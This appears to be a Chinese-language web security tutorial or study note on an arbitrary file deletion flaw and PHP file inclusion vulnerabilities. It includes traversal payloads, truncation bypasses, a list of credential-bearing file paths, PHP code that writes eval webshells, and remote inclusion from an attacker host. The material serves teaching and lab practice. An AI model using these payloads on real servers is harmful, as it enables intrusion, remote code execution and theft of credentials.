+<p>漏洞文件位置：/plugins/sys/admin/Plugins.php 第285-299行：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//删除</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span>{<br>	    <span class="hljs-variable">$dir</span> = <span class="hljs-variable language_">$this</span>-&gt;input-&gt;<span class="hljs-title function_ invoke__">get_post</span>(<span class="hljs-string">'dir'</span>,<span class="hljs-literal">true</span>);<br>	    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span>==<span class="hljs-string">''</span>){<br>	    	<span class="hljs-title function_ invoke__">getjson</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">'plub_del_0'</span>),<span class="hljs-number">1</span>);<br>	    }<br>        <span class="hljs-title function_ invoke__">deldir</span>(FCPATH.<span class="hljs-string">'plugins'</span>.FGF.<span class="hljs-variable">$dir</span>.FGF);<br>		<span class="hljs-comment">//删除配置目录</span><br>        <span class="hljs-title function_ invoke__">deldir</span>(CSCMS.<span class="hljs-variable">$dir</span>.FGF);<br>		<span class="hljs-comment">//删除模板目录</span><br>        <span class="hljs-title function_ invoke__">deldir</span>(FCPATH.<span class="hljs-string">'tpl/admin/'</span>.<span class="hljs-variable">$dir</span>.FGF);<br>        <span class="hljs-variable">$info</span>[<span class="hljs-string">'func'</span>] = <span class="hljs-keyword">__FUNCTION__</span>;<br>        <span class="hljs-variable">$info</span>[<span class="hljs-string">'msg'</span>] = <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">'plub_del_1'</span>);<br>        <span class="hljs-title function_ invoke__">getjson</span>(<span class="hljs-variable">$info</span>,<span class="hljs-number">0</span>);<br>	}<br></code></pre></td></tr></tbody></table></figure>
+<p>漏洞利用:</p>
+<p>?dir=…\test;</p>
+<p><img src="image-20230517163057707.png" alt="image-20230517163057707"></p>
+<p>自己搭建一个</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Type:text/html;charset=utf-8"</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>)){<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('删除成功')&lt;/script&gt;"</span>;<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('删除失败')&lt;/script&gt;"</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230517163829614.png" alt="image-20230517163829614"></p>
+<p>执行查询后，文件被删除成功了, 目录中没了, 当然也可以遍历目录删除</p>
+<p><img src="image-20230517163902714.png" alt="image-20230517163902714"></p>
+<h3 id="1-5-修复建议">1.5 修复建议</h3>
+<p>限制文件删除函数可删除的目录位置、文件类型</p>
+<p>文件名非用户可控</p>
+<h2 id="0x04-文件包含">0x04 文件包含</h2>
+<p><strong>为何要进行文件包含？</strong></p>
+<p>​		程序员写程序的时候，不喜欢干同样的事情，也不喜欢把同样的代码（比如一些公用的函数）写几次，于是就把需要公用的代码写在一个单独的文件里面，比如 share.php，而后在其它文件需要使用时进行包含调用。在php里，我们就是使用上面列举的那几个函数来达到这个目的的，它的工作流程：如果你想在 main.php里包含share.php,我将这样写 include(“share.php”) ，然后就可以使用share.php中的函数了</p>
+<p>文件包含漏洞汇总: <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119715692?spm=1001.2014.3001.5501"><strong>文件包含</strong></a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">常见的文件包含函数:<br>PHP：include() 、include_once()、require()、require_once()<br>JSP/Servlet：ava.io.file()、java.io.filereader()<br>ASP：include file、include virtual<br></code></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">文件包含各个脚本代码 ASP,PHP,JSP,ASPX等<br>&lt;! --#include file=“1.asp” --&gt;<br>&lt;c:import url=“http://thief.one/1.jsp”&gt;<br>&lt;jsp:include page=“head.jsp”/&gt;<br>&lt;%@ include file=“head.jsp”%&gt; &lt;?php Include('test.php')?&gt;<br></code></pre></td></tr></tbody></table></figure>
+<p>​		黑盒测试（Black-box testing）是一种软件测试方法，其中测试人员在测试过程中只关注输入和输出，而对被测试系统的内部结构和实现细节不了解。测试人员将软件系统视为一个"黑盒子"，只能观察和测试其功能和行为，而不了解其内部工作原理。</p>
+<p>​		简单来说, 应该跟白名单一样, 当你输入的参数是正确的或者是系统认可的, 那你就可以成功输入</p>
+<h3 id="1-1文件包含漏洞的原理">1.1文件包含漏洞的原理</h3>
+<p>​		文件包含漏洞是一种常见的web类型漏洞,因为很多脚本语言支持使用文件包含,也就是我们所说的文件包含函数，网站开发者经常会把一些代码插入到指定的地方,从而节省时间避免再次编写 ,这就是包含函数的基础解释  ,但是我们不光可以包含我们预先指定的文件，也可以包含我们服务器内部的其他文件，前提条件就是我们需要有可读的权限才能读取这些文件  ,所以这样就会导致文件包含漏洞</p>
+<h3 id="1-2文件包含漏洞产生的原因">1.2文件包含漏洞产生的原因</h3>
+<p>​		在网站的开发人员在开发网站的时候，会把经常重复使用的函数或者特定的页面写到单个文件中，需要使用的时候就直接调用此文件即可，而无需再次浪费时间再次编写，这种操作通常被称为文件包含。</p>
+<p>​		如果我们没有对文件的来源进行严格的审查，也就是程序员在编写代码的时候触犯的逻辑性的错误就可能会导致文件读取漏洞和其它类型的漏洞，我们已php为例，在<strong>php中常用的文件包含函数有（include、require、include_once、require_once）</strong>,后续会介绍其中的区别。</p>
+<h5 id="1-2-1-无限制-有限制的包含">1.2.1 无限制&amp;有限制的包含</h5>
+<p>无限制为直接直接包含文件：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p>有限制为直接直接包含文件：以添加固定后缀为例</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>.<span class="hljs-string">".html"</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<h3 id="1-3漏洞的形成需要的条件">1.3漏洞的形成需要的条件</h3>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1、`include()`等函数通过`动态变量的方式`引入需要包含的文件；<br>2、`用户能够控制`这个动态变量；<br><br>注：一般来说服务端通过`GET`和`POST`两种请求方式来传递需要包含的文件的话就是用户可控的。<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="1-3文件包含漏洞实例">1.3文件包含漏洞实例</h3>
+<p>​		Apace  solr是apache公司研发的一款开源的搜索服务,应用范围很广,而且应用的人群也是很广的，但是在近几年它被爆出存在任意文件读取的漏洞，攻击者可以通过构造指定的payload对服务器内部文件进行读取的操作，这就造成很大的危害，因为我们可以通过读取敏感的数据从而控制服务器。</p>
+<h3 id="1-4文件包含漏洞分类">1.4文件包含漏洞分类</h3>
+<p>​		其文件包含漏洞共分为两大类，本地文件包含和远程文件包含，但是如果想要实现远程文件包含，需要php.ini开启了allow_url_fopen和allow_url_include的配置。<strong>包含的文件是第三方服务器的文件。本地文件包含的含义就是包含本地服务器的文件</strong></p>
+<h5 id="1-4-1-本地包含">1.4.1 本地包含</h5>
+<p><strong>原理：</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">本地文件包含（Local File Include，LFI），能够读取或执行包含本地文件的漏洞，称为本地文件包含漏洞。<br><br>  LFI允许攻击者通过浏览器包含本机上的文件。当一个WEB应用程序在没有正确过滤输入数据的情况下，就有可能存在这个漏洞，该漏洞允许攻击者操纵输入数据、注入路径遍历字符、包含web服务器的其他文件。<br></code></pre></td></tr></tbody></table></figure>
+<p>无限制：可直接包含<a target="_blank" rel="noopener" href="http://127.0.0.1:8888/webinclude.php?filename=phpinfo.txt">http://127.0.0.1:8888/webinclude.php?filename=phpinfo.txt</a><br>
+有限制：即漏洞使用有干扰，则需要特殊方法绕过</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%00 截断：条件：magic_quotes_gpc = off php版本&lt;5.3.4<br>长度截断：条件：区分操作系统：windows点号需要长于256；linux长于4096<br></code></pre></td></tr></tbody></table></figure>
+<h5 id="1-4-2-远程包含">1.4.2 远程包含</h5>
+<p>无限制：直接包含：<a target="_blank" rel="noopener" href="http://192.168.114.11/webinclude.php?filename=http://www.xiaodi8.com/readme.txt">http://192.168.114.11/webinclude.php?filename=http://www.xiaodi8.com/readme.txt</a></p>
+<p>限制强制添加.html 可以用以上的符号 ? 、%23（#注释符） 、%20（空格）（不可用）</p>
+<p><strong>注意：</strong></p>
+<p>为什么文件包含一般使用txt格式的文件？</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> 1、文件包含是无视文件格式的，只要文件中含有php代码，它就会把这个文件解析为1php脚本文件；<br> 2、当靶机对我们远端服务器的php脚本远程文件包含时，由于我们远端服务器可以解析php脚本，这样的话，我们远端服务器首先会对这个php脚本进行解析执行，远端服务器解析完成后，直接把解析后的结果返回给靶机服务器，由于是在我们远端服务器里面进行解析执行的，所以返回的结果就是我们远端服务器的执行结果。<br>  当我们使用txt格式或者其他非php格式进行文件包含时，由于我们远端服务器没有对文件进行包含，不会在我们远端服务器进行解析；当靶机对我们远端服务器的这个txt文件进行远程文件包含时，靶机对 txt文件进行读取时，这就相当于靶机服务器通过远程文件包含把我们远端服务器的txt文件拿到靶机上面了，靶机发现里面有php代码，这个时候，靶机就会按照php脚本对它进行解析；由于是在靶机里面读取的，所以执行的结果就是靶机的。<br>  远程文件包含需要包含我们服务器上的文件或者公网上的文件。<br></code></pre></td></tr></tbody></table></figure>
+<h5 id="1-4-3-本地文件包含代码测试-原理">1.4.3 本地文件包含代码测试-原理</h5>
+<p>本地准备 phpinfo的txt文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8888/webinclude.php?filename=phpinfo.txt<br><br> 大多代码语言文件包含中可添加路径以读取其他路径下文件：`../../`，`d:\`等<br></code></pre></td></tr></tbody></table></figure>
+<p>有限制时：以添加 .html后缀为例</p>
+<p><img src="image-20230516210127283.png" alt="image-20230516210127283"></p>
+<h5 id="1-4-4-远程文件包含代码测试-原理">1.4.4 远程文件包含代码测试-原理</h5>
+<p>对于远程包含，若php环境禁止，即没有远程包含功能</p>
+<p><img src="image-20230516210211631.png" alt="image-20230516210211631"></p>
+<p>无限制时直接包含：(可以使用?和#进行伪截断，该方法对PHP版本没要求，但是要求能够包含远程文件。)</p>
+<p><img src="image-20230516210241172.png" alt="image-20230516210241172"></p>
+<p>以添加 .html后缀为例的限制级：</p>
+<p><img src="image-20230516210306433.png" alt="image-20230516210306433"></p>
+<h5 id="1-4-5-远程文件包含代码测试-原理">1.4.5 远程文件包含代码测试-原理</h5>
+<p>1、查看<code>远端服务器</code>的<code>ip</code>和<code>phpinfo();</code>信息:<br>
+<code>ip</code>：<code>185.243.241.45</code><br>
+<code>phpinfo()信息</code>:<code>php版本为5.6.40</code></p>
+<p>2、查看<code>靶机</code>的<code>ip</code>和<code>phpinfo();</code>信息:<br>
+<code>ip</code>：<code>127.0.0.1</code><br>
+<code>phpinfo()信息</code>:<code>php版本为7.3.4</code></p>
+<p>3、在<code>远端服务器</code>网站主目录下，创建两个文件，一个是<code>1.php</code>，一个是<code>1.txt</code>:<br>
+内容:</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230617192123081.png" alt="image-20230617192123081"></p>
+<p>4、在靶机上面对远端服务器的1.php文件进行文件包含，可以看出，解析的结果为远端服务器的phpinfo();信息，如果使用一句话木马的话，获得的webshell也是自己的远端服务器的：</p>
+<p>注:这里之所以返回的是我们的远端服务器的phpinfo();信息，是因为phpinfo();脚本在我们的远端服务器上面被执行了，执行完成后，通过文件包含返回了远端服务器的执行结果。也就是说这个执行结果不是靶机网站的而是我们自己的远端服务器的执行结果。</p>
+<p><img src="image-20230617192222910.png" alt="image-20230617192222910"></p>
+<p>5、在靶机上面远程包含我们远端服务器网站主目录下的1.txt文件，可以看出，可以看出解析的结果为靶机的phpinfo();信息：<br>
+注:当我们使用txt格式或者其他非php格式进行文件包含时，由于我们远端服务器没有对文件进行包含，不会在我们远端服务器进行解析；所以当靶机对我们远端服务器的这个1.txt文件进行远程文件包含时，远端服务器不对它做解析，靶机对1.txt进行读取时，发现里面有php代码，这个时候，靶机就会按照php脚本对它进行解析；由于是在靶机里面读取的，所以执行的结果就是靶机的。<br>
+<img src="image-20230617192350773.png" alt="image-20230617192350773"></p>
+<p>1.4.6 包含大马文件：</p>
+<p>1、复制一个大马文件<code>dama.php</code>到主机的网站主目录下，并修改后缀名为<code>txt格式</code>：</p>
+<p>2、直接访问这个文件，发现服务器是以<code>文本文件</code>的方式打开：</p>
+<p><img src="image-20230617193306604.png" alt="image-20230617193306604"></p>
+<p>3、对这个文件进行远程文件包含，发现<code>dama.txt</code>格式的文件被以<code>php脚本</code>的形式解析了：</p>
+<p>这里不知道为啥我显示的页面不对劲，下面展示一个正常的</p>
+<p><img src="image-20230617194754228.png" alt="image-20230617194754228"></p>
+<p><img src="image-20230617194850487.png" alt="image-20230617194850487"></p>
+<h5 id="1-4-6-写入文件脚本方式，写入一句话木马">1.4.6 写入文件脚本方式，写入一句话木马</h5>
+<p>1、在虚拟机网站主目录下面创建一个<code>3.txt</code>的文件,通过这个文件向服务器里面写入一句话木马yih.php文件：<br>
+内容：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>  <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'yjh.php'</span>,<span class="hljs-string">'w'</span>);<br>  <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">'&lt;?php @eval($_REQUEST[666]);?&gt;'</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p>3、使用远程文件进行包含这个文件，并查看文件包含目录下，已经创建了一个<code>yjh.php</code>的文件：</p>
+<p><img src="image-20230617195307122.png" alt="image-20230617195307122"></p>
+<p>4、使用蚁剑进行连接，成功获得webshell（这里注意添加yjh.php的路径法）</p>
+<p><img src="image-20230617215223521.png" alt="image-20230617215223521"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">注意:<br>  有时候，我们无法通过传入参数进行访问phpinfo页面，可能是DVWA的环境问题；还有就算我们能够连接到这个文件，但是菜刀连接不上，这个时候我们可以创建一个写入文件的脚本文件，通过访问这个脚本文件，在目标服务器里面创建一个一句话木马的方式进行连接。<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="1-5漏洞的攻击步骤">1.5漏洞的攻击步骤</h3>
+<p>我们将从php语言的角度来看一下文件包含漏洞，以及相关的攻击步骤</p>
+<p>在php语言当中，有四种文件包含的函数，分别是include、require、include_once、require_once</p>
+<p>Include：被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.include-path">include_path</a>指定的目录寻找。如果在 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.include-path">include_path</a>下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.include.php">警告</a>；</p>
+<p>ps：php开启错误题型需要配置php.ini中disaply_errors为On</p>
+<p>Require：require 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.include.php">include</a>几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 E_COMPILE_ERROR 级别的错误。换句话说将导致脚本中止而 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.include.php">include</a>只产生警告（E_WARNING），脚本会继续运行。</p>
+<p>Include_once：include_once 语句在脚本执行期间包含并运行指定文件。<strong>此行为和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.include.php">include</a>语句类似</strong>，唯一区别是如果该文件中已经被包含过，则不会再次包含，且 include_once 会返回 true。 如同此语句名字暗示的那样，该文件只会包含一次。 include_once  可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。</p>
+<p>Require_once：<strong>require_once 语句和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.require.php">require</a>语句完全相同</strong>，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">我们来总结下，include函数在执行文件时候每次都要进行读取和评估，在找不到文件的情况下会发出一条警告，且还会继续运行，require则会给出一条致命错误，从而停止运行，include_once和require_once和include和require类似，但他们仅仅只包含一次。<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="1-5-1-判断服务器类型">1.5.1 判断服务器类型</h4>
+<p>​	 其实判断服务器类型还是很好判断的, 在linux系统当存在1.php的时候读取就是cat 1.php，而且读取的内容假如是：“I Love You”，若是读取1.Php那么还能够显示"I Love You"吗？结果肯定是不行的，由于在linux中是严格区分大小写的。而在windows中是不区分大小写的，这里就可以使用windows进行测试。<br>
+<img src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20230517163902714.png" alt="image-20230517163902714"></p>
+<p>通过上面的图片能够看出来，我在URL中读取的是1.phP，但文件夹中只有1.php，但依旧显示PHP的默认文件。这就验证了我上面提到的Windows是不区分大小写的。</p>
+<h4 id="1-5-2-敏感文件读取">1.5.2 敏感文件读取</h4>
+<p>所谓读取敏感文件，就是将WEB服务器上一些其他文件读取出来，这些其他文件中可能包含一些敏感文件，私密文件或者是一些数据、表格等。</p>
+<h4 id="1-5-3-绝对路径读取">1.5.3 绝对路径读取</h4>
+<p>绝对路径是指目录下的绝对位置，直接到达目标位置，通常是从盘符开始的路径，绝对路径读取就是通过明确的路径进行读取文件，比如windows或者linxu中的一些日志文件存在的路径，或者一些配置文件存放的路径。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">windows敏感文件的绝对路径<br>C:\boot.ini                       #查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml      #IIS配置文件<br>C:\windows\repair\sam          #存储Windows的密码<br>C:\programFiles\mysql\my.ini     #mysql配置文件，里面可能有密码<br>C:\programFiles\mysql\data\mysql\user.MYD      #mysql root密码<br>C:\windows\php.ini             #php配置文件<br><br>linux敏感文件的绝对路径<br>/etc/passwd                      #用户密码<br>/usr/local/app/apache2/conf/httpd.conf         #apache2默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf   #虚拟网站设置<br>/usr/local/app/php5/lib/php.ini       #php相关设置        <br>/etc/httpd/conf/httpd.conf           #apache配置文件        <br>/etc/my.cnf                       #mysql配置文件<br>/etc/sysconfig/iptables              #查看防火墙策略<br></code></pre></td></tr></tbody></table></figure>
+<h5 id="绝对路径读取案例">绝对路径读取案例</h5>
+<p>通过URL看到我这里是直接读取我C:\tool\PHPTutorial\1.txt的文件。</p>
+<p><img src="image-20230516213104548.png" alt="image-20230516213104548"></p>
+<h4 id="1-5-4-相对路径读取">1.5.4 相对路径读取</h4>
+<p>相对路径就是指由这个文件所在的路径引起的跟其它文件（或文件夹）的路径关系。相对路径读取就是当我们不知道某个文件具体路径的时候，使用相对路径以当前位置作为参看向后退，逐次访问。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">相对路径读取方式<br><br>相对利用读取方式就需要使用"…/“来进行读取，一次”../“向后退一次。<br>例如：当我们在C:\tool\PHPTutorial\www的时候，那么我们使用”…/“的时候我们就退到C:\tool\PHPTutorial，若使用两次”…/“的时候就会退到C:\tool，两次”../“也就是”../../"就可以了。<br></code></pre></td></tr></tbody></table></figure>
+<p>eg__1:</p>
+<p>这里我把1.txt创建在C:\tool\PHPTutorial目录下，而现在这个文件包含漏洞放在www下也就是C:\tool\PHPTutorial\www，所以这里我只需要输入一次"…/"就可以读取到1.txt了。<br>
+<img src="https://img-blog.csdnimg.cn/39771706a3684c569aba259647f2fbd8.png#pic_center" alt="在这里插入图片描述"></p>
+<p>eg__2:</p>
+<p>这里我们思考一下若我们要访问C:\windows\win.ini，该怎么读取呢？其实这里可以先退到根目录下也就是C盘下，然后在访问windows中的win.ini。<br>
+  目前我们在C:\tool\PHPTutorial\www下面，那么可以算一下我们要退几次？这里通过目录也能够看出来，这里只需要退三次就可以到C盘下了。<br>
+  这里由于无法在C盘中创建文件，就无法演示了，那么这里我们直接读取C:\windows\win.ini吧。<br>
+<img src="image-20230516213710530.png" alt="image-20230516213710530"></p>
+<p>eg__3:</p>
+<p>这里又出现一个问题，若我们并不知道我们存在那个目录下，更不知道该退几级怎么办？其实这里通过"…/“退可以多退几次，因为最终只能够退到C盘，所以在不知道几级的情况下，可以多输入几个”…/“。<br>
+  可以看我下面的图片，我原本只需要退三次就可以了，而我这里退八次依旧能读取到，所以就能证明刚刚我所解释的，不管输入多少个”…/"最终只会退到C盘。<br>
+<img src="image-20230516213735512.png" alt="image-20230516213735512"></p>
+<h4 id="1-5-5-远程文件读取">1.5.5 远程文件读取</h4>
+<p>远程文件包含大概意思在之前已经提过了，这里就演示一下案例。<br>
+前提条件：目标服务器的allow_url_fopen选项是on。只有当这个选项是on的时候就能够使用远程文件包含一句话木马。</p>
+<p>这里用别人的演示</p>
+<p>远程文件配合一句话木马案例</p>
+<p>网站服务器：192.168.10.150<br>
+  攻击者主机：192.168.10.50</p>
+<p>攻击者php代码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php fputs(fopen("shell.php", "w"),"&lt;?php @eval($_POST['pass']);?&gt;")?&gt;<br><br>这句话的意思就是当访问这个php代码后就会在当前目录生成一个shell.php文件，并且这个文件中含有一句话木马。<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230516214821124.png" alt="image-20230516214821124"></p>
+<p>通过查看服务器网站根目录，可以看到这里已经创建了一个名为shell.php的文件。那么我们通过这个文件使用蚁剑进行连接。</p>
+<p><img src="image-20230516214838533.png" alt="image-20230516214838533"></p>
+<p>通过上面的图片可以看到，我们已经成功连接了。这里需要注意的是，我们这个地址是知道的，若在实际环境中操作的时候可能需要注意查找路径。</p>
+<p>基于上面的文件包含的知识背景，我们可以有一个攻击的大概步骤：</p>
+<p>我们先从include函数入手，来看一下include函数有什么特殊的地方，为此我们编写一个小脚本来验证下。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p>​		在验证文件包漏洞的时候我们通常使用/etc/passwd文件是否能够被成功读取，该文件是我们linux的用户组信息，且这个文件的权限所有用户都可读。且里面包含的信息是我们当前服务器的所有用户的信息，属于敏感信息。</p>
+<p>现在我们用这个小脚本验证一下是否能够成功的读取/etc/passwd文件。</p>
+<p><img src="image-20230515143407188.png" alt="image-20230515143407188"></p>
+<p>我们发现成功的读取了/etc/passwd下面的文件。下面我们换一下我们要读取的文件，换个不存在的文件试一试，看看有什么效果</p>
+<p><img src="image-20230515143437660.png" alt="image-20230515143437660"></p>
+<p>​		我们可以看到我们的服务器报了个warning的错误,因为此文件不存在，这正好是include函数的特点，文件不在的时候会丢出warning的错误，然后还会接着运行下去。接下来我们将include函数切换到require函数，看看有什么区别。</p>
+<p><img src="image-20230515144539592.png" alt="image-20230515144539592"></p>
+<p>​		我们可以看到，我们的include在找不到文件的情况下会丢出warning的错误，而我们的requore函数直接丢出failed错误，直接就停止运行了，这就是我们之前介绍我们include和require函数的区别的地方。</p>
+<p>​		下面我们从session文件包含来进行getshell的演示，我们先从phpinfo的信息获取到我们session的存储位置（这个位置其实我们可以猜测到的，因为就那几个固定的存储位置，例如：/var/lib/php5/sessions、/var/lib/php7/sessions、/var/lib/php/sessions等）</p>
+<p>ps: 接下来先跟着吧,我的环境是windows的…</p>
+<p><img src="image-20230515145134146.png" alt="image-20230515145134146"></p>
+<p>为了验证session文件包含漏洞我们编写了一个简单的脚本，如下所示：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'PHPSESSID'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];<br></code></pre></td></tr></tbody></table></figure>
+<p>​		我们先打开浏览器访问此文件，然后我们在按F12键，查看我们的cookie，我们可以看到我们cookie中有个PHPSESSID的名称，其中它的值就是我们sessionid的值，也就是我们需要包含的文件。<img src="image-20230515145516306.png" alt="image-20230515145516306"></p>
+<p>我们在通过这个脚本，向seesion写入恶意的数据</p>
+<p><img src="image-20230515145729711.png" alt="image-20230515145729711"></p>
